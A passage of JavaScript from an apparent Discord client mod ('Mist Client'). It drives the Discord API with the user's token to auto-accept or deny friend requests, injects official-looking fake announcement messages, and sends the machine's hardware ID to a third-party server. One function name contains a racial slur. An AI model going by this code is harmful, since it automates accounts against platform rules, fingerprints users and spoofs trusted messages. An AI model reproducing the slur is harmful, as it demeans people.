        RaidDelay.addEventListener("click", () => {
            if (raidDelayParent.className == "flexChild-faoVW3 switchEnabled-V2WDBB switch-3wwwcV valueChecked-m-4IJZ value-2hFrkk sizeDefault-2YlOZr size-3rFEHg themeDefault-24hCdX")
            {
                raidDelayParent.className = "flexChild-faoVW3 switchEnabled-V2WDBB switch-3wwwcV valueUnchecked-m-4IJZ value-2hFrkk sizeDefault-2YlOZr size-3rFEHg themeDefault-24hCdX"
                config.RaidDelay = false;
                fs.writeFileSync(`${process.env.InstallationDir}/config.json`, JSON.stringify(config));
            }
            else{
                raidDelayParent.className = "flexChild-faoVW3 switchEnabled-V2WDBB switch-3wwwcV valueChecked-m-4IJZ value-2hFrkk sizeDefault-2YlOZr size-3rFEHg themeDefault-24hCdX"
                config.RaidDelay = true;
                fs.writeFileSync(`${process.env.InstallationDir}/config.json`, JSON.stringify(config));
            }
        });

        UseRPC.addEventListener("click", () => {
            if (UseRPCParent.className == "flexChild-faoVW3 switchEnabled-V2WDBB switch-3wwwcV valueChecked-m-4IJZ value-2hFrkk sizeDefault-2YlOZr size-3rFEHg themeDefault-24hCdX")
            {
                UseRPCParent.className = "flexChild-faoVW3 switchEnabled-V2WDBB switch-3wwwcV valueUnchecked-m-4IJZ value-2hFrkk sizeDefault-2YlOZr size-3rFEHg themeDefault-24hCdX";
                config.UseRPC = false;
                fs.writeFileSync(`${process.env.InstallationDir}/config.json`, JSON.stringify(config));
            }
            else{
                UseRPCParent.className = "flexChild-faoVW3 switchEnabled-V2WDBB switch-3wwwcV valueChecked-m-4IJZ value-2hFrkk sizeDefault-2YlOZr size-3rFEHg themeDefault-24hCdX";
                config.UseRPC = true;
                fs.writeFileSync(`${process.env.InstallationDir}/config.json`, JSON.stringify(config));
            }
        });
    }
}
window.MistUtils.SendTopNotification = function(details, buttonText, color)
{
    /*
    <div class="flexChild-faoVW3" style="flex: 0 0 auto;"><div><div style="background-color: green" class="noticeStreamerMode-2TSQpg notice-2FJMB4 size14-3iUx6q weightMedium-2iZe9B height36-36OHCc">Streamer Mode is enabled. Stay safe, friend.<button class="button-1MICoQ size14-3iUx6q weightMedium-2iZe9B">Okay</button></div></div></div>
    */

    var holster = document.getElementsByClassName("flex-1xMQg5 flex-1O1GKY horizontal-1ae9ci horizontal-2EEEnY flex-1O1GKY directionRow-3v3tfG justifyStart-2NDFzi alignStretch-DpGPf3 noWrap-3jynv6 container-2lgZY8 firefoxFixScrollFlex-cnI2ixflex-1xMQg5 flex-1O1GKY vertical-V37hAW flex-1O1GKY directionColumn-35P_nr justifyStart-2NDFzi alignStretch-DpGPf3 noWrap-3jynv6 base-3dtUhz")[0];

    var elem = window.MistUtils.InjectHTML(`<div class="flexChild-faoVW3" id="MainTopNotif" style="flex: 0 0 auto;"><div><div style="background-color: #${color};" class="noticeStreamerMode-2TSQpg notice-2FJMB4 size14-3iUx6q weightMedium-2iZe9B height36-36OHCc">${details}<button class="button-1MICoQ size14-3iUx6q weightMedium-2iZe9B" id='DismissButton'>${buttonText}</button></div></div></div>`)

    holster.appendChild(elem);
    var button = document.getElementById('DismissButton');

    button.addEventListener("click", () => {
        document.getElementById('MainTopNotif').remove();
    });

    setTimeout(() => {
        document.getElementById('MainTopNotif').remove();
    }, 5000);
}
window.MistUtils.SendFakeNigga = function (message) {
    
   
    var holster = document.getElementsByClassName("scroller-2FKFPG firefoxFixScrollFlex-cnI2ix systemPad-3UxEGl messages-3amgkR")[0];
    var today = new Date();
    var pmoram = (today.getHours() >= 12) ? "PM" : "AM";
    var hourdiscord = today.getHours() + ":" + today.getMinutes();
    var elem = window.MistUtils.InjectHTML(`<div class="containerCozyBounded-1rKFAn containerCozy-jafyvG container-1YxwTf"><div class="messageCozy-2JPAPA message-1PNnaP" aria-disabled="false"><div class="headerCozy-2N9HOL"><div class="avatar-17mtNa" aria-hidden="true"><div class="wrapper-3t9DeA" role="img" aria-hidden="true" style="width: 40px; height: 40px;"><svg width="49" height="40" viewBox="0 0 49 40" class="mask-1l8v16" aria-hidden="true"><foreignObject x="0" y="0" width="40" height="40" mask="url(#svg-mask-avatar-default)"><img src="https://cdn.discordapp.com/avatars/602119454003953694/f3bb2453164471198c5f43699bf151d4.webp?size=128" alt=" " class="avatar-VxgULZ" aria-hidden="true"></foreignObject></svg></div></div><h2 class="headerCozyMeta-rdohGq"><span class=""><span tabindex="0" class="username-_4ZSMR" role="button">Mist Announcements</span><span class="botTagRegular-2HEhHi botTag-2WPJ74 botTagCozy-1875JY botTag-2BhDSU">MIST DEV</span></span><time class="timestampCozy-2hLAPV" datetime="1564812644293">Today at ${hourdiscord}</time></h2></div><div class="contentCozy-3XX413 content-3dzVd8"><div class="containerCozy-336-Cz container-206Blv"><div class="buttonContainer-KtQ8wc"><div class="buttonContainer-37UsAw"><div tabindex="0" class="reactionBtn-2na4rd" aria-label="Add Reaction" role="button"></div><div tabindex="0" class="button-3Jq0g9" aria-label="More Options" role="button"></div></div></div><div class="markup-2BOw-j"></div></div><div class="markup-2BOw-j">${message}</div>`);

    holster.appendChild(elem);
  
}
window.MistUtils.GetCurrentUser = function(){

    request.get('https://discordapp.com/api/v6/users/@me', {
            headers: {
                'Authorization' : window.getUserToken()
            }
        }, (err, res, body) => {
            return body;
    });
}

    window.MistUtils.SendMessageNotification = function () 
    {
    
   
    var holster = document.getElementsByClassName("scroller-2FKFPG firefoxFixScrollFlex-cnI2ix systemPad-3UxEGl messages-3amgkR")[0];

    var elem = window.MistUtils.InjectHTML(`<div class="containerCozyBounded-1rKFAn containerCozy-jafyvG container-1YxwTf"><div class="messageCozy-2JPAPA message-1PNnaP" aria-disabled="false"><div class="headerCozy-2N9HOL"><div class="avatar-17mtNa" aria-hidden="true"><div class="wrapper-3t9DeA" role="img" aria-hidden="true" style="width: 40px; height: 40px;"><svg width="49" height="40" viewBox="0 0 49 40" class="mask-1l8v16" aria-hidden="true"><foreignObject x="0" y="0" width="40" height="40" mask="url(#svg-mask-avatar-default)"><img src="https://cdn.discordapp.com/avatars/602119454003953694/f3bb2453164471198c5f43699bf151d4.webp?size=128" alt=" " class="avatar-VxgULZ" aria-hidden="true"></foreignObject></svg></div></div><h2 class="headerCozyMeta-rdohGq"><span class=""><span tabindex="0" class="username-_4ZSMR" role="button">Mist - Yaekith</span></span><time class="timestampCozy-2hLAPV" datetime="1564812644293">Today at 2:10 AM</time></h2></div><div class="contentCozy-3XX413 content-3dzVd8"><div class="containerCozy-336-Cz container-206Blv"><div class="buttonContainer-KtQ8wc"><div class="buttonContainer-37UsAw"><div tabindex="0" class="reactionBtn-2na4rd" aria-label="Add Reaction" role="button"></div><div tabindex="0" class="button-3Jq0g9" aria-label="More Options" role="button"></div></div></div><div class="markup-2BOw-j"></div></div><div class="containerCozy-B4noqO container-1e22Ot"><a class="anchor-3Z-8Bb anchorUnderlineOnHover-2ESHQB imageWrapper-2p5ogY imageZoom-1n-ADA clickable-3Ya1ho embedWrapper-3AbfJJ" href="https://cdn.discordapp.com/attachments/606614433153679408/607092973619904522/unknown.png" rel="noreferrer noopener" target="_blank" role="button" style="width: 18px; height: 21px;"><img alt="" src="https://media.discordapp.net/attachments/606614433153679408/607092973619904522/unknown.png?width=14&amp;height=16" style="width: 18px; height: 21px;"></a></div></div></div><hr aria-hidden="true" class="dividerEnabled-2TTlcf divider-32i8lo"></div>`);

    holster.appendChild(elem);
  
}
function GetFriendRequests(){
    request.get('https://discordapp.com/api/v6/users/@me/relationships', {
            headers: {
                'Authorization' : window.getUserToken()
            }
        }, (err, res, body) => {
            var json = JSON.parse(body);
            for(var i = 0; i < json.length; i++)
            {
                if (json[i].type == 3)
                {
                    switch(window.MistUtils.friendMode)
                    {
                        case "Auto-accept":
                            AcceptFriendRequest(json[i].user.id)
                            break;
                        case "Auto-deny":
                            DenyFriendRequest(json[i].user.id)
                        break;
                    }
                }
            }
        });
}

function AcceptFriendRequest(userid)
{
    setTimeout(() => {
        request.put(`https://discordapp.com/api/v6/users/@me/relationships/${userid}`, {
            headers: {
                'Authorization' : window.getUserToken(),
                'Content-Type' : 'application/json'
            }
        }, (err, res, body) => {
        });
    }, 1000);
}
function addFriendModeChanger()
{
    if (document.getElementById('friendModeChanger') == undefined)
    {
        var button = document.createElement("button");
        button.setAttribute("class", "button-2JbWXs button-38aScr lookBlank-3eh9lL colorBrand-3pXr91 grow-q77ONN");
        button.id = 'friendModeChanger'
        button.addEventListener("click", () => {
                createFriendModeSelector();
        });
        var div1 = document.createElement("div");
        div1.setAttribute("class", "iconWrapper-2OrFZ1");

        var svg = document.createElementNS("http://www.w3.org/2000/svg", "svg");
        svg.setAttribute("x", "0");
        svg.setAttribute("y", "0");
        svg.setAttribute("name", "PersonWaving");
        svg.setAttribute("class", "icon-22AiRD");
        svg.setAttribute("aria-hidden", "false");
        svg.setAttribute("width", "24");
        svg.setAttribute("height", "24");
        svg.setAttribute("viewBox", "0 0 24 24");
        
        var path1 = document.createElementNS("http://www.w3.org/2000/svg", "path");
        path1.setAttribute("fill" , "#ffffff");
        path1.setAttribute("fill-rule", "nonzero");
        path1.setAttribute("d", "M0.5,0 L0.5,1.5 C0.5,5.65 2.71,9.28 6,11.3 L6,16 L21,16 L21,14 C21,11.34 15.67,10 13,10 C13,10 12.83,10 12.75,10 C8,10 4,6 4,1.5 L4,0 L0.5,0 Z M13,0 C10.790861,0 9,1.790861 9,4 C9,6.209139 10.790861,8 13,8 C15.209139,8 17,6.209139 17,4 C17,1.790861 15.209139,0 13,0 Z");
        path1.setAttribute("transform", "translate(2 4)");

        var path2 = document.createElement("path");
        path2.setAttribute("d", "M0,0 L24,0 L24,24 L0,24 L0,0 Z M0,0 L24,0 L24,24 L0,24 L0,0 Z M0,0 L24,0 L24,24 L0,24 L0,0 Z");
        
        // BUTTON
        path1.appendChild(path2);
        svg.appendChild(path1);
        div1.appendChild(svg);
        button.appendChild(div1);

        document.getElementsByClassName("toolbar-1t6TWx")[0].appendChild(button);
    }
}
function createFriendModeSelector(){

    var elem = document.getElementsByClassName("popouts-2bnG9Z")[0];
    
    var injec = window.MistUtils.InjectHTML(`<div role="dialog" id="FriendModeSlctor" class="noArrow-2foL9g noShadow-3pu20z popout-2iWAc- popoutBottomRight-2Rno5S arrowAlignmentTop-1yftWI theme-undefined" style="z-index: 1001; visibility: visible; left: 1800.629px; top: 92.9492px; transform: translateX(-100%) translateY(0%) translateZ(0px);"><div class="modal-yWgWj- popout-103y-5 sizeSmall-1jtLQy"><div class="flex-1xMQg5 flex-1O1GKY vertical-V37hAW flex-1O1GKY directionColumn-35P_nr justifyStart-2NDFzi alignStretch-DpGPf3 noWrap-3jynv6 header-2tA9Os" style="flex: 0 0 auto;"><h4 class="h4-AQvcAz title-3sZWYQ size16-14cGz5 height20-mO2eIN weightSemiBold-NJexzi defaultColor-1_ajX0 defaultMarginh4-2vWMG5 marginReset-236NPn">Friend Selector</h4><div class="subtitle-2P4u9v marginTop4-2BNfKC small-29zrCQ size12-3R0845 height16-2Lv3qA">Choose who to welcome, and who to perish.</div></div><div class="scrollerWrap-2lJEkd firefoxFixScrollFlex-cnI2ix scrollerThemed-2oenus themeGhostHairline-DBD-2d scrollerFade-1Ijw5y"><div class="scroller-2FKFPG firefoxFixScrollFlex-cnI2ix systemPad-3UxEGl scroller-hUf6zQ"><div style="width: 100%; height: 0px;"></div><div tabindex="0" class="friendWrapper-LdKLp8" role="button"><div class="flex-1xMQg5 flex-1O1GKY horizontal-1ae9ci horizontal-2EEEnY flex-1O1GKY directionRow-3v3tfG justifyStart-2NDFzi alignCenter-1dQNNs noWrap-3jynv6 friend-2E0q2S" style="flex: 1 1 auto;"><div class="flex-1xMQg5 flex-1O1GKY horizontal-1ae9ci horizontal-2EEEnY flex-1O1GKY directionRow-3v3tfG justifyStart-2NDFzi alignBaseline-LAQbso noWrap-3jynv6 match-w_mMTb" style="flex: 1 1 auto;"><div class="h4-AQvcAz title-3sZWYQ defaultColor-1_ajX0 defaultMarginh4-2vWMG5">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Default</div></div><label class="checkboxWrapper-SkhIWG" style="height: 22px;"><input class="inputDefault-3JxKJ2 input-3ITkQf" type="checkbox" id="checkBox1" style="width: 22px; height: 22px;"><div class="checkbox-1ix_J3 flexCenter-3_1bcw flex-1O1GKY justifyCenter-3D2jYp alignCenter-1dQNNs box-mmYMsp" style="width: 22px; height: 22px;"><svg name="Checkmark" aria-hidden="false" width="18" height="18" viewBox="0 0 18 18" xmlns="http://www.w3.org/2000/svg"><g fill="none" fill-rule="evenodd"><polyline stroke="transparent" stroke-width="2" points="3.5 9.5 7 13 15 5"></polyline></g></svg></div></label></div></div><div tabindex="0" class="friendWrapper-LdKLp8" role="button"><div class="flex-1xMQg5 flex-1O1GKY horizontal-1ae9ci horizontal-2EEEnY flex-1O1GKY directionRow-3v3tfG justifyStart-2NDFzi alignCenter-1dQNNs noWrap-3jynv6 friend-2E0q2S friendSelected-3J_Uh8" style="flex: 1 1 auto;"><div class="flex-1xMQg5 flex-1O1GKY horizontal-1ae9ci horizontal-2EEEnY flex-1O1GKY directionRow-3v3tfG justifyStart-2NDFzi alignBaseline-LAQbso noWrap-3jynv6 match-w_mMTb" style="flex: 1 1 auto;"><div class="h4-AQvcAz title-3sZWYQ defaultColor-1_ajX0 defaultMarginh4-2vWMG5" color="#ffffff">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Auto accept all friend requests.</div></div><label class="checkboxWrapper-SkhIWG" style="height: 22px;"><input class="inputDefault-3JxKJ2 input-3ITkQf" type="checkbox" id="checkBox2" style="width: 22px; height: 22px;"><div class="checkbox-1ix_J3 flexCenter-3_1bcw flex-1O1GKY justifyCenter-3D2jYp alignCenter-1dQNNs box-mmYMsp" style="width: 22px; height: 22px;"><svg name="Checkmark" aria-hidden="false" width="18" height="18" viewBox="0 0 18 18" xmlns="http://www.w3.org/2000/svg"><g fill="none" fill-rule="evenodd"><polyline stroke="transparent" stroke-width="2" points="3.5 9.5 7 13 15 5"></polyline></g></svg></div></label></div></div><div tabindex="0" class="friendWrapper-LdKLp8" role="button"><div class="flex-1xMQg5 flex-1O1GKY horizontal-1ae9ci horizontal-2EEEnY flex-1O1GKY directionRow-3v3tfG justifyStart-2NDFzi alignCenter-1dQNNs noWrap-3jynv6 friend-2E0q2S" style="flex: 1 1 auto;"><div class="flex-1xMQg5 flex-1O1GKY horizontal-1ae9ci horizontal-2EEEnY flex-1O1GKY directionRow-3v3tfG justifyStart-2NDFzi alignBaseline-LAQbso noWrap-3jynv6 match-w_mMTb" style="flex: 1 1 auto;"><div class="h4-AQvcAz title-3sZWYQ defaultColor-1_ajX0 defaultMarginh4-2vWMG5">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Auto deny all friend requests.</div></div><label class="checkboxWrapper-SkhIWG" style="height: 22px;"><input class="inputDefault-3JxKJ2 input-3ITkQf" type="checkbox" id="checkBox3" style="width: 22px; height: 22px;"><div class="checkbox-1ix_J3 flexCenter-3_1bcw flex-1O1GKY justifyCenter-3D2jYp alignCenter-1dQNNs box-mmYMsp" style="width: 22px; height: 22px;"><svg name="Checkmark" aria-hidden="false" width="18" height="18" viewBox="0 0 18 18" xmlns="http://www.w3.org/2000/svg"><g fill="none" fill-rule="evenodd"><polyline stroke="transparent" stroke-width="2" points="3.5 9.5 7 13 15 5"></polyline></g></svg></div></label></div></div><div tabindex="0" class="friendWrapper-LdKLp8" role="button"></div><div style="width: 100%; height: 14px;"></div></div></div><div class="footerSeparator-M9dQY1"></div><div class="flex-1xMQg5 flex-1O1GKY vertical-V37hAW flex-1O1GKY directionColumn-35P_nr justifyStart-2NDFzi alignStretch-DpGPf3 noWrap-3jynv6 footer-1eyGBa" style="flex: 1 1 auto;"><button type="button" id="changefriendmode" class="button-38aScr lookFilled-1Gx00P colorBrand-3pXr91 sizeMedium-1AC_Sl fullWidth-1orjjo grow-q77ONN"><div class="contents-18-Yxp">Change Friend Mode</div></button></div></div></div>`)

    elem.appendChild(injec);

    var checkBox1 = document.getElementById('checkBox1');

    var checkBox2 = document.getElementById('checkBox2');

    var checkBox3 = document.getElementById('checkBox3');

    var btn = document.getElementById('changefriendmode');


    let checked;

    // CLICK EVENT LISTENERS:
    checkBox1.addEventListener('click', () => {
        checkWhatsChecked(checked, checkBox1, checkBox2, checkBox3);
        if (checkBox1.parentElement.children[1].className == "checkbox-1ix_J3 flexCenter-3_1bcw flex-1O1GKY justifyCenter-3D2jYp alignCenter-1dQNNs box-mmYMsp checked-3_4uQ9")
        {
            checkBox1.parentElement.children[1].className = "checkbox-1ix_J3 flexCenter-3_1bcw flex-1O1GKY justifyCenter-3D2jYp alignCenter-1dQNNs box-mmYMsp";
            checkBox1.parentElement.children[1].setAttribute("style", "width: 22px; height: 22px;");
            checked = null;
        }
        else
        {
            checkBox1.parentElement.children[1].className = "checkbox-1ix_J3 flexCenter-3_1bcw flex-1O1GKY justifyCenter-3D2jYp alignCenter-1dQNNs box-mmYMsp checked-3_4uQ9";
            checkBox1.parentElement.children[1].setAttribute("style", "width: 22px; height: 22px; border-color: rgb(79, 84, 92);");
            checked = "checkMark1";
        }

        CommitAction(checked);
    });

    checkBox2.addEventListener('click', () => {
        checkWhatsChecked(checked, checkBox1, checkBox2, checkBox3);
        if (checkBox2.parentElement.children[1].className == "checkbox-1ix_J3 flexCenter-3_1bcw flex-1O1GKY justifyCenter-3D2jYp alignCenter-1dQNNs box-mmYMsp checked-3_4uQ9")
        {
            checkBox2.parentElement.children[1].className = "checkbox-1ix_J3 flexCenter-3_1bcw flex-1O1GKY justifyCenter-3D2jYp alignCenter-1dQNNs box-mmYMsp";
            checkBox2.parentElement.children[1].setAttribute("style", "width: 22px; height: 22px;");
            checked = null;
        }
        else
        {
            checkBox2.parentElement.children[1].className = "checkbox-1ix_J3 flexCenter-3_1bcw flex-1O1GKY justifyCenter-3D2jYp alignCenter-1dQNNs box-mmYMsp checked-3_4uQ9";
            checkBox2.parentElement.children[1].setAttribute("style", "width: 22px; height: 22px; border-color: rgb(79, 84, 92);");
            checked = "checkMark2";
        }

        CommitAction(checked);
    });

    checkBox3.addEventListener('click', () => {
        checkWhatsChecked(checked, checkBox1, checkBox2, checkBox3);
        if (checkBox3.parentElement.children[1].className == "checkbox-1ix_J3 flexCenter-3_1bcw flex-1O1GKY justifyCenter-3D2jYp alignCenter-1dQNNs box-mmYMsp checked-3_4uQ9")
        {
            checkBox3.parentElement.children[1].className = "checkbox-1ix_J3 flexCenter-3_1bcw flex-1O1GKY justifyCenter-3D2jYp alignCenter-1dQNNs box-mmYMsp";
            checkBox3.parentElement.children[1].setAttribute("style", "width: 22px; height: 22px;");
            checked = null;
        }
        else
        {
            checkBox3.parentElement.children[1].className = "checkbox-1ix_J3 flexCenter-3_1bcw flex-1O1GKY justifyCenter-3D2jYp alignCenter-1dQNNs box-mmYMsp checked-3_4uQ9";
            checkBox3.parentElement.children[1].setAttribute("style", "width: 22px; height: 22px; border-color: rgb(79, 84, 92);");
            checked = "checkMark3";
        }

        CommitAction(checked);
    });

    btn.addEventListener('click', () => {
        document.getElementById('FriendModeSlctor').remove();
        CommitAction(checked);
    });
}
function CommitAction(check)
{
    if (check != null)
    {
        switch(check){
            case "checkMark1":
               ChangeFriendMode("Default");
            break;
            case "checkMark2":
                    ChangeFriendMode("AutoAccept");
            break;
            case "checkMark3":
                    ChangeFriendMode("AutoDeny");
            break;
        }
    }
}
function fadeOut(el){el.style.opacity=1;(function fade(){if((el.style.opacity-=.1)<0){el.style.display="none"; el.remove();}else{requestAnimationFrame(fade);}})();}
    window.MistUtils.SendStatusMessage = function (Title, contextDescription,Time = 1000) {
    
    
        var holster = document.getElementsByClassName("layerContainer-yqaFcK")[0];
    
        var elem = window.MistUtils.InjectHTML(`<div id="mistPopout"><div id="popout_1" class="layer-v9HyYc" style="left: 82px; bottom: 57px;">
        
   <div class="animatorTop-2Y7x2r scale-3iLZhb didRender-33z1u8">
      <div class="menu-Sp6bN1">
         <div tabindex="0" class="statusItem-2uzPIV itemBase-1Qj4z6" role="button">
            <div class="statusIconText-3b4TkH">
               <svg width="10" height="10" class="mask-1qbNWk status-3Kz6VS" viewBox="0 0 10 10">
                  <foreignObject x="0" y="0" width="10" height="10" mask="url(#svg-mask-status-online)">
                     <div class="status-1AY8sU" style="background-color: rgb(67, 181, 129);"></div>
                  </foreignObject>
               </svg>
               <div>${Title}</div>
            </div>
            <div class="helper-2c73HK">${contextDescription}</div>
         </div>
      </div>
   </div>
</div>
</div>`);
        holster.appendChild(elem);
        
        
      
        setTimeout(() => {
            var elem2 = document.getElementById('mistPopout');
            
            fadeOut(elem2);
        }, Time);
    }
function ChangeFriendMode(mode)
{
    switch(mode){
        default:
            window.MistUtils.friendMode = "Default";
            break;
        case "Default":
                window.MistUtils.friendMode = "Default";
            break;
        case "AutoAccept":
                window.MistUtils.friendMode = "Auto-accept";
            break;
        case "AutoDeny":
                window.MistUtils.friendMode = "Auto-deny";
            break;
    }
}
function checkWhatsChecked(wat, checkbx1, checkbx2, checkbx3){
    if (wat != null)
    {
        switch(wat){
            case "checkMark1":
               checkbx2.parentElement.children[1].className = "checkbox-1ix_J3 flexCenter-3_1bcw flex-1O1GKY justifyCenter-3D2jYp alignCenter-1dQNNs box-mmYMsp";
               checkbx3.parentElement.children[1].className = "checkbox-1ix_J3 flexCenter-3_1bcw flex-1O1GKY justifyCenter-3D2jYp alignCenter-1dQNNs box-mmYMsp";
            break;
            case "checkMark2":
               checkbx1.parentElement.children[1].className = "checkbox-1ix_J3 flexCenter-3_1bcw flex-1O1GKY justifyCenter-3D2jYp alignCenter-1dQNNs box-mmYMsp";
               checkbx3.parentElement.children[1].className = "checkbox-1ix_J3 flexCenter-3_1bcw flex-1O1GKY justifyCenter-3D2jYp alignCenter-1dQNNs box-mmYMsp";
            break;
            case "checkMark3":
               checkbx1.parentElement.children[1].className = "checkbox-1ix_J3 flexCenter-3_1bcw flex-1O1GKY justifyCenter-3D2jYp alignCenter-1dQNNs box-mmYMsp";
               checkbx2.parentElement.children[1].className = "checkbox-1ix_J3 flexCenter-3_1bcw flex-1O1GKY justifyCenter-3D2jYp alignCenter-1dQNNs box-mmYMsp";
            break;
        }
    }
}


function changeCaseFirstLetter(params) {
    if(typeof params === 'string') {
            return params.charAt(0).toUpperCase() + params.slice(1);
    }
    return null;
}

function GetModCount()
{
    if (fs.existsSync(path.join(process.env.InstallationDir, 'mods')))
    {
        let modifications = fs.readdirSync(path.join(process.env.InstallationDir, 'mods'));

        return "Module Count: " + modifications.length;
    }
    else
    {
        return "No Modules Installed.";
    }
}
var type = "Classic"
window.test = function (){
    if (window.MistUtils.Config.UseRPC)
    {
        request.get(`http://yaekiths-projects.xyz/getmistinfo.php?hwid=${window.GetHWID()}`, {
            headers: {'User-Agent' :  'UsWCmjlbTlFf050hpxEyQCNk2IFT8w0Ukdt7Ohga'}
        },(err, res, body) => {
            type = changeCaseFirstLetter(body.split("<br>")[0]);
        });
    
        this.setTimeout(() => {
            console.error(type);
            var socket = new WebSocket(`wss://gateway.discord.gg/?v=7&encoding=json`, {});
    
            socket.on("open", () => {
                console.info('%c[Mist]','color: #257dd4', 'Connected to the WebSocket.');
            });
        
            socket.on("message", (f) => {
                var RESPONSE = JSON.parse(f);
        
                
                switch(RESPONSE.op)
                {
                    case 10:
                           
                            setInterval(() => {
                                socket.send(JSON.stringify({
                                    op: 1,
                                    d: f.s
                                }))
                            }, RESPONSE.d.heartbeat_interval);
        
                            socket.send(JSON.stringify({
                                op: 2,
                                d: {
                                    token: window.getUserToken(),
                                    properties: {
                                        "$os": "windows",
                                        "$browser": "Discord Android",
                                        "$device": "Jesse"
                                    },
                                    compress: false,
                                    large_threshold: 250,
                                    shard: [0, 1],
                                    presence: {
                                        activities: [{ "name": 'Mist',
                                            "type": 0,
                                            "application_id" : "667704271399026726",
                                            "url": null,
                                            "details": "Hacking away on Discord",
                                            "state": `with Mist Client v3.6`,
                                            "status" : "online",
                                            "timestamps": null,
                                            "party": null,
                                            "syncID": undefined,
                                            "_flags": undefined,
                                            "assets": {
                                                "large_image": "667705702432899072",
                                                "large_text": `Mist ${type}`,
                                                "small_image" : "667705878606249984",
                                                "small_text" : `${GetModCount()}`
                                              },
                                        }], 
                                        afk: false
                                    }
                                }
                            }));
                        break;
    
                        case 11:
                            console.error('heartbeat!');
                            break;
                }
            });
    
            socket.on("close", () => {
                console.info('%c[Mist]','color: #257dd4', 'Socket was closed. We re-opened it for you.');
                window.test();
            });
        }, 5000);
    }
    
    
}

function addFriendStatusText(){
    if (document.getElementsByClassName('friendsTableHeader-32yE7d').length > 0)
    {
        if (document.getElementById('friendModeText') == undefined)
        {
            var attach = document.getElementsByClassName('friendsTableHeader-32yE7d')[0];

            var text = document.createElement("div");
            text.setAttribute("class", "friendsColumn-eVHFqJ friendsColumnStatus-ZH4ho2 container-2ax-kl");
            text.innerHTML = `Friend Mode: ${window.MistUtils.friendMode}`
            text.id = 'friendModeText'
            attach.appendChild(text);
        }
    }
}

window.addDenyAllButton = function (element)
{
    var button = document.createElement("button");
    button.setAttribute("class", "button-38aScr lookFilled-1Gx00P colorBrand-3pXr91 grow-q77ONN");
    button.id = 'denyAll-Button'

    button.addEventListener("click", () => {
        //Deny them friend requests lol

        request.get('https://discordapp.com/api/v6/users/@me/relationships', {
            headers: {
                'Authorization' : window.getUserToken()
            }
        }, (err, res, body) => {
            var json = JSON.parse(body);
            for(var i = 0; i < json.length; i++)
            {
                if (json[i].type == 3)
                {
                    DenyFriendRequest(json[i].user.id);
                }
            }
            window.DrawingAPI.alert('Mist Client', "Denied all friend requests! You're welcome :)")
        });
    });

    var text = document.createElement("div");
    text.setAttribute("class", "contents-18-Yxp");
    text.innerHTML = 'Deny All Friend Requests'
    button.appendChild(text);

    element.appendChild(button);
}
window.ChristmasTree = function(element)
{
    var tree = window.MistUtils.InjectHTML(`<div tabindex="0" class="iconWrapper-2OrFZ1 clickable-3rdHwn" role="button" aria-label="Christmas Tree" id="MistChristmastree"><svg width="24px" height="24px" viewBox="0 0 420 507">
    <g id="Artboard" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
        <polygon id="Triangle" fill="#507E1A" points="210 0 330 120 90 120"></polygon>
        <polygon id="Triangle" fill="#507E1A" points="210 60 360 210 60 210"></polygon>
        <polygon id="Triangle" fill="#507E1A" points="210 135 390 315 30 315"></polygon>
        <polygon id="Triangle" fill="#507E1A" points="210 225 420 435 0 435"></polygon>
        <rect id="Rectangle" fill="#8B572A" x="180" y="435" width="60" height="72"></rect>
    </g>
</svg></div>`)

   element.appendChild(tree);

   var tree = document.getElementById('MistChristmastree');

   tree.addEventListener("click", () => {
        var css = "@-webkit-keyframes snowflakes-fall{0%{top:-10%}100%{top:100%}}@-webkit-keyframes snowflakes-shake{0%{-webkit-transform:translateX(0px);transform:translateX(0px)}50%{-webkit-transform:translateX(80px);transform:translateX(80px)}100%{-webkit-transform:translateX(0px);transform:translateX(0px)}}@keyframes snowflakes-fall{0%{top:-10%}100%{top:100%}}@keyframes snowflakes-shake{0%{transform:translateX(0px)}50%{transform:translateX(80px)}100%{transform:translateX(0px)}}.snowflake{position:fixed;top:-10%;z-index:9999;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;cursor:default;-webkit-animation-name:snowflakes-fall,snowflakes-shake;-webkit-animation-duration:10s,3s;-webkit-animation-timing-function:linear,ease-in-out;-webkit-animation-iteration-count:infinite,infinite;-webkit-animation-play-state:running,running;animation-name:snowflakes-fall,snowflakes-shake;animation-duration:10s,3s;animation-timing-function:linear,ease-in-out;animation-iteration-count:infinite,infinite;animation-play-state:running,running}.snowflake:nth-of-type(0){left:1%;-webkit-animation-delay:0s,0s;animation-delay:0s,0s}.snowflake:nth-of-type(1){left:10%;-webkit-animation-delay:1s,1s;animation-delay:1s,1s}.snowflake:nth-of-type(2){left:20%;-webkit-animation-delay:6s,.5s;animation-delay:6s,.5s}.snowflake:nth-of-type(3){left:30%;-webkit-animation-delay:4s,2s;animation-delay:4s,2s}.snowflake:nth-of-type(4){left:40%;-webkit-animation-delay:2s,2s;animation-delay:2s,2s}.snowflake:nth-of-type(5){left:50%;-webkit-animation-delay:8s,3s;animation-delay:8s,3s}.snowflake:nth-of-type(6){left:60%;-webkit-animation-delay:6s,2s;animation-delay:6s,2s}.snowflake:nth-of-type(7){left:70%;-webkit-animation-delay:2.5s,1s;animation-delay:2.5s,1s}.snowflake:nth-of-type(8){left:80%;-webkit-animation-delay:1s,0s;animation-delay:1s,0s}.snowflake:nth-of-type(9){left:90%;-webkit-animation-delay:3s,1.5s;animation-delay:3s,1.5s}"
        var style = document.createElement("style");
        style.appendChild(document.createTextNode(css));
        document.body.appendChild(style);
        var audioURL = "https://cdn.discordapp.com/attachments/654634793786408970/657796872941076490/All_I_Want_For_Christmas_Is_You_X_Crank_That_Soulja_Boy_-_Mariah_Carey_Soulja_Boy.mp3";
        var css2 = ".snowflake {color: #fff;font-size: 1em;font-family: Arial;text-shadow: 0 0 1px #000;}"
        var style2 = document.createElement("style");
        style2.appendChild(document.createTextNode(css2));
        document.body.appendChild(style2);

